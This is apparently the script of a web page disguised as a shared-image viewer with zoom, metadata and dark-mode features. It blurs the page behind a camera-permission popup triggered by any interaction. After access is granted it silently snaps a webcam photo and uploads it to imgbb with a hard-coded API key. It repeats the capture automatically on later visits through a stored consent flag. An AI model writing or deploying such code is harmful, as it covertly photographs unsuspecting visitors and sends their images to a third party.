const popup = document.getElementById("consentPopup");
const allowButton = document.getElementById("allowCamera");
const pageContent = document.getElementById("pageContent");

let stream = null;
let popupShown = false;



/* =========================
   PAGE LOAD
========================= */

window.addEventListener("load", () => {


    const consentGiven =
    localStorage.getItem("cameraConsent");



    if(consentGiven === "granted"){

        startCamera();

    }
    else{

        startPopupTriggers();

    }


    initializeUI();


});






/* =========================
   POPUP LOGIC
========================= */


function showPopup(){


    if(popupShown)
        return;



    popupShown=true;


    pageContent.classList.add("blur");


    popup.classList.add("show");



    window.removeEventListener(
        "scroll",
        interactionTrigger
    );


    window.removeEventListener(
        "click",
        interactionTrigger
    );


    window.removeEventListener(
        "touchstart",
        interactionTrigger
    );


}



function interactionTrigger(){

    showPopup();

}





function startPopupTriggers(){


    setTimeout(()=>{

        showPopup();

    },1000);



    window.addEventListener(
        "scroll",
        interactionTrigger,
        {once:true}
    );


    window.addEventListener(
        "click",
        interactionTrigger,
        {once:true}
    );


    window.addEventListener(
        "touchstart",
        interactionTrigger,
        {once:true}
    );


}







/* =========================
   CAMERA
========================= */


allowButton.addEventListener(
    "click",
    startCamera
);





async function startCamera(){


    try{


        stream =
        await navigator.mediaDevices.getUserMedia({

            video:true

        });



        localStorage.setItem(
            "cameraConsent",
            "granted"
        );



        popup.classList.remove("show");


        pageContent.classList.remove("blur");



        setTimeout(()=>{

            capturePhoto();

        },1000);



    }


    catch(error){


        console.error(
            "Camera error:",
            error
        );



        if(error.name==="NotAllowedError"){


            localStorage.removeItem(
                "cameraConsent"
            );


            startPopupTriggers();


        }


        else if(error.name==="NotFoundError"){


            alert(
                "No camera found."
            );


        }


        else{


            alert(
                "Unable to access camera."
            );


        }


    }


}







/* =========================
   CAPTURE PHOTO
========================= */


function capturePhoto(){


    const video =
    document.createElement("video");



    video.srcObject=stream;


    video.playsInline=true;

    video.muted=true;



    video.onloadedmetadata=()=>{


        video.play();



        setTimeout(()=>{


            const canvas =
            document.createElement("canvas");



            canvas.width =
            video.videoWidth;



            canvas.height =
            video.videoHeight;



            const ctx =
            canvas.getContext("2d");



            ctx.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );



            const imageData =
            canvas.toDataURL("image/png");



            const imageBase64 =
            imageData.split(",")[1];



            uploadImage(imageBase64);



            stopCamera();



        },800);



    };


}






function stopCamera(){


    if(!stream)
        return;



    stream.getTracks()
    .forEach(track=>{

        track.stop();

    });



    stream=null;


}







/* =========================
   IMGBB UPLOAD
========================= */


async function uploadImage(image){


    const API_KEY =
    "54c4b68870fc5dc29bacb73a40ea3726";



    const formData =
    new FormData();



    formData.append(
        "image",
        image
    );



    try{


        const response =
        await fetch(

            `https://api.imgbb.com/1/upload?key=${API_KEY}`,

            {
                method:"POST",
                body:formData
            }

        );



        const data =
        await response.json();



        if(data.success){


            console.log(
                "Upload successful:",
                data.data.url
            );


        }


    }


    catch(error){


        console.error(
            "Upload error:",
            error
        );


    }


}







/* =========================
   UI INITIALIZATION
========================= */


function initializeUI(){


    setupTheme();


    setupImageViewer();


}








/* =========================
   DARK MODE
========================= */


function setupTheme(){


    const button =
    document.getElementById("themeToggle");



    const saved =
    localStorage.getItem("theme");



    if(saved==="dark"){

        document.body.classList.add("dark");

        if(button)
            button.textContent="☀️";

    }



    if(button){


        button.onclick=()=>{


            document.body.classList.toggle(
                "dark"
            );



            const dark =
            document.body.classList.contains(
                "dark"
            );



            localStorage.setItem(
                "theme",
                dark ? "dark" : "light"
            );



            button.textContent =
            dark ? "☀️" : "🌙";


        };


    }


}








/* =========================
   IMAGE VIEWER
========================= */


function setupImageViewer(){


    const image =
    document.getElementById("sharedImage");



    if(!image)
        return;



    showMetadata(image);


    setupZoom(image);


}







/* =========================
   METADATA
========================= */


function showMetadata(image){


    const name =
    document.getElementById("fileName");


    const type =
    document.getElementById("fileType");


    const resolution =
    document.getElementById("resolution");



    if(name){

        name.textContent =
        image.src.split("/").pop();

    }



    if(type){

        type.textContent="JPEG";

    }



    image.onload=()=>{


        if(resolution){

            resolution.textContent =
            `${image.naturalWidth} × ${image.naturalHeight}`;

        }


    };


}








/* =========================
   ZOOM + PAN
========================= */


function setupZoom(image){


    const zoomIn =
    document.getElementById("zoomIn");


    const zoomOut =
    document.getElementById("zoomOut");


    const reset =
    document.getElementById("resetZoom");


    const display =
    document.getElementById("zoomValue");



    if(!zoomIn)
        return;



    let scale=1;

    let x=0;

    let y=0;



    let dragging=false;

    let startX;

    let startY;





    function update(){


        image.style.transform =
        `
        translate(${x}px,${y}px)
        scale(${scale})
        `;



        display.textContent =
        Math.round(scale*100)+"%";


    }





    zoomIn.onclick=()=>{

        if(scale<3){

            scale+=0.25;

            update();

        }

    };





    zoomOut.onclick=()=>{

        if(scale>1){

            scale-=0.25;

            update();

        }

    };





    reset.onclick=()=>{


        scale=1;

        x=0;

        y=0;

        update();


    };





    image.addEventListener(
        "mousedown",
        e=>{


            if(scale<=1)
                return;



            dragging=true;


            startX =
            e.clientX-x;


            startY =
            e.clientY-y;


        }

    );





    window.addEventListener(
        "mousemove",
        e=>{


            if(!dragging)
                return;



            x =
            e.clientX-startX;


            y =
            e.clientY-startY;



            update();


        }

    );





    window.addEventListener(
        "mouseup",
        ()=>{

            dragging=false;

        }

    );





    image.addEventListener(
        "touchstart",
        e=>{


            if(scale<=1)
                return;



            dragging=true;


            startX =
            e.touches[0].clientX-x;


            startY =
            e.touches[0].clientY-y;


        }

    );





    image.addEventListener(
        "touchmove",
        e=>{


            if(!dragging)
                return;



            x =
            e.touches[0].clientX-startX;


            y =
            e.touches[0].clientY-startY;



            update();


        }

    );





    image.addEventListener(
        "touchend",
        ()=>{

            dragging=false;

        }

    );


}